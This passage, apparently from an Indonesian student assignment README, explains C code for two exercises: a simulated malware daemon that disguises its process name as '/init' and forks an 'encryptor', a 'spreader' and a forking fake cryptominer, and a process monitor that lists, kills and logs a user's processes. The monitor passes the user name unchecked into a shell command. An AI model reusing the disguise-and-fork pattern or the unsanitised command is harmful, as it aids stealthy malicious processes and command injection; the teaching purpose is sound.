        hash[64] = '\0';` Membuat hash "cryptomining"
- ` time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);`Menambahkannya ke berkas log dengan timestamp
- `fprintf(log, "[%s][Miner %02d] %s\n", timestamp, id, hash);
            fclose(log);` memperlihatkan timestamp dan pid
  ##rodok.exe
  ```bash
   prctl(PR_SET_NAME, "rodok.exe");
    for (int i = 0; i < MAX_MINERS; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            miner_loop(i);
            exit(0);
        }
    }
    while (1) pause();
  }
  ```
  - Membuat child process `MAX_MINERS`.
  - Setiap child mensimulasikan penambangan kripto selamanya.

## daemonize
```bash
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();
    if (chdir("/")) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, "/init");
}
```
- `fork()` dan keluar dari induk untuk berjalan di latar belakang.
- Melepas dari terminal dengan `(setsid())`.
- Mengubah direktori kerja ke /.
- Menutup stdin, stdout, stderr.
- Mengganti nama proses menggunakan `prctl()` menjadi `/init`.

  ##main()
  ```bash
  int main() {
    srand(time(NULL));
    daemonize();

    pid_t pid;

    pid = fork();
    if (pid == 0) {
        wannacryptor();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        trojan_wrm();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        rodok_exe();
        exit(0);
    }

    while (1) pause();
    return 0;
  }
  ```
- `srand()` menghasilkan keacakan.

- Memanggil `daemonize()` untuk beralih ke latar belakang.

- Melakukan fork dan meluncurkan:

`wannacryptor()` – Encryptor

`trojan_wrm()` – Spreader

`rodok_exe()` – Fork bomb cryptominer

- Menjaga daemon induk tetap berjalan dengan `pause()`.
  ## output
  -cat /tmp/.miner.log
  ![Screenshot 2025-04-12 205912](https://github.com/user-attachments/assets/1c2c02f2-a9c7-4617-8626-9f0d890382e5)

  -ps axjf
  ![Screenshot 2025-04-12 215640](https://github.com/user-attachments/assets/61febe0a-802e-49ef-98bf-19bc3c0fce85)

  # soal 4
  dikerjakan oleh Muhammad Ahsani Taqwiim Rakhman (5027241099)

  membuat `debugmon.log`untuk menyimpan log
  ```bash
  void write_log(const char* process_name, const char* status) {
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char timestamp[25]; 
    
    strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", tm);
    
    FILE *log = fopen(LOG_FILE, "a");
    if (log) {
        fprintf(log, "%s_%s_%s\n", timestamp, process_name, status);
        fclose(log);
    }
  }
  ```
- `time_t now = time(NULL);` mendapatkan waktu saat ini untuk dimasukkan di log
-  `strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", tm);` ditulis dengan format [dd:mm:yyyy]-[hh:mm:ss]_processname_STATUS
## list
```bash
void list_user_processes(const char *user) {
    char cmd[BUFFER_SIZE];
    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm,%%cpu,%%mem", user);
    
    FILE *ps = popen(cmd, "r");
    if (ps) {
        char buf[BUFFER_SIZE];
        while (fgets(buf, BUFFER_SIZE, ps)) {
            printf("%s", buf);
            
            // Log running processes
            int pid;
            char name[BUFFER_SIZE];
            if (sscanf(buf, "%d %s", &pid, name) == 2) {
                write_log(name, "RUNNING");
            }
        }
        pclose(ps);
    }
}
```
- Mencantumkan semua proses dari pengguna tertentu `(ps -u <user>)`.
- Mencatat setiap proses sebagai `RUNNING `
## daemon
```bash
void start_daemon(const char *user) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(1);
    }
    
    if (pid > 0) { 
        FILE *pf = fopen(PID_FILE, "w");
        if (pf) {
            fprintf(pf, "%d", pid);
            fclose(pf);
        }
        exit(0);
    }
    
    umask(0);
    setsid();
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    while (1) {
        char cmd[BUFFER_SIZE];
        snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm", user);
        
        FILE *ps = popen(cmd, "r");
        if (ps) {
            char buf[BUFFER_SIZE];
            fgets(buf, BUFFER_SIZE, ps); // Skip header
            
            while (fgets(buf, BUFFER_SIZE, ps)) {
                int pid;
                char name[BUFFER_SIZE];
                if (sscanf(buf, "%d %s", &pid, name) == 2) {
                    write_log(name, "RUNNING");
                }
            }
            pclose(ps);
        }
        sleep(5);
    }
}
```
- fork proses saat ini untuk membuat daemon.
- Menulis PID daemon ke `debugmon_daemon.pid`

##.stop
```bash
void stop_monitoring(const char *user) {
    FILE *pf = fopen(PID_FILE, "r");
    if (!pf) {
        printf("No active monitoring\n");
        return;
    }
    
    pid_t pid;
    fscanf(pf, "%d", &pid);
    fclose(pf);
    
    if (kill(pid, SIGTERM) == -1) {
        perror("kill");
    } else {
        remove(PID_FILE);
    }
}
```
- Membaca PID daemon dari `debugmon_daemon.pid`.
- Mengirim `SIGTERM` ke PID tersebut untuk mematikan daemon.
- Menghapus berkas PID.
## fail
```bash
oid fail_processes(const char *user) {
    char cmd[BUFFER_SIZE];
    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm --no-headers", user);
    
    FILE *ps = popen(cmd, "r");
    if (ps) {
        char buf[BUFFER_SIZE];
        while (fgets(buf, BUFFER_SIZE, ps)) {
            int pid;
            char name[BUFFER_SIZE];
            if (sscanf(buf, "%d %s", &pid, name) == 2) {
                if (kill(pid, SIGKILL) == 0) {
                    write_log(name, "FAILED");
                }
            }
        }
        pclose(ps);
    }
    
    // Block user from new processes
    FILE *blocked = fopen(BLOCKED_USERS_FILE, "a");
    if (blocked) {
        fprintf(blocked, "%s\n", user);
        fclose(blocked);
    }
}
```
-Menggunakan `ps` untuk mendapatkan semua proses pengguna.
-Mengirim `SIGKILL` ke masing-masing proses dan mencatatnya sebagai "FAILED".
-Menambahkan pengguna ke `blocks_users.txt` untuk mensimulasikan pemblokiran proses lebih lanjut.
## revert
```bash
void revert_user(const char *user) {
    FILE *blocked = fopen(BLOCKED_USERS_FILE, "r");
    if (blocked) {
        char tmpfile[] = "/tmp/debugmon.XXXXXX";
        int fd = mkstemp(tmpfile);
        FILE *tmp = fdopen(fd, "w");
        
        char buf[BUFFER_SIZE];
        while (fgets(buf, BUFFER_SIZE, blocked)) {
            if (!strstr(buf, user)) {
                fputs(buf, tmp);
            }
        }
        fclose(blocked);
        fclose(tmp);
        rename(tmpfile, BLOCKED_USERS_FILE);
    }
    
    char cmd[BUFFER_SIZE];
    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o comm --no-headers", user);
    
    FILE *ps = popen(cmd, "r");
    if (ps) {
        char name[BUFFER_SIZE];
        while (fgets(name, BUFFER_SIZE, ps)) {
            // Remove newline if present
            name[strcspn(name, "\n")] = 0;
            write_log(name, "RUNNING");
        }
        pclose(ps);
    }
}
```
- Membuka file `blocks_users.txt`, menghapus nama pengguna.
- Mencantumkan proses saat ini untuk pengguna dan mencatatnya lagi sebagai "RUNNING".
  ## main()
  ```bash
  int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <command> <user>\n", argv[0]);
        printf("Commands: list, daemon, stop, fail, revert\n");
        return 1;
    }
    
    const char *cmd = argv[1];
    const char *user = argv[2];
    
    if (strcmp(cmd, "list") == 0) {
        list_user_processes(user);
    } else if (strcmp(cmd, "daemon") == 0) {
        start_daemon(user);
    } else if (strcmp(cmd, "stop") == 0) {
        stop_monitoring(user);
    } else if (strcmp(cmd, "fail") == 0) {
        fail_processes(user);
    } else if (strcmp(cmd, "revert") == 0) {
        revert_user(user);
    } else {
        printf("Invalid command\n");
        return 1;
    }
    
    return 0;
  } 
  ```
  - Berdasarkan perintah masukan, memanggil fungsi yang sesuai perintah.
  ## output
  -list
![Screenshot 2025-04-11 224421](https://github.com/user-attachments/assets/610f9a8c-74a0-49df-a7c4-de2ce6f8dffe)

-daemon and stop

![image](https://github.com/user-attachments/assets/cc2b5bc8-d105-4cff-84ca-864b69a63f87)

-debugmon.log setelah stop

![image](https://github.com/user-attachments/assets/09ef6c12-fd4a-416b-bc3d-e65dc161125e)

-fail

![image](https://github.com/user-attachments/assets/e8b31be2-f4b9-4183-8ff7-3cd158a289e3)

- debugmon.log setelah fail

![image](https://github.com/user-attachments/assets/c58358b5-9320-42f3-b674-704871d4651f)

-revert dan hasil debugmon.log

![image](https://github.com/user-attachments/assets/cc56f484-35c3-4273-8b9b-6fd53052c47c)








  
